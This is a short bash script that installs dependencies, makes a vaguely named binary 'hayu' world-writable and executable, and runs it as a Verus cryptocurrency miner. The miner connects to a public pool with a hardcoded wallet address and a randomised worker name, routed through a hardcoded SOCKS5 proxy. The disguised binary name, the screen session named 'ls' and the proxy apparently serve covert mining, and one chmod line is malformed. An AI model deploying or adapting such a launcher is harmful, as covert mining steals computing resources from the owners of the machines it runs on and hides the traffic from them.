#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x gass.sh && chmod +x hayu chmod 777 hayu gass.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RT8DNmxnDDRCLScadn7efqKuDLFvrB9unv
WORKER=$(echo $(shuf -i 1-10 -n 1)OJAKK)
PROXY=socks5://198.50.163.192:3129
./hayu -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
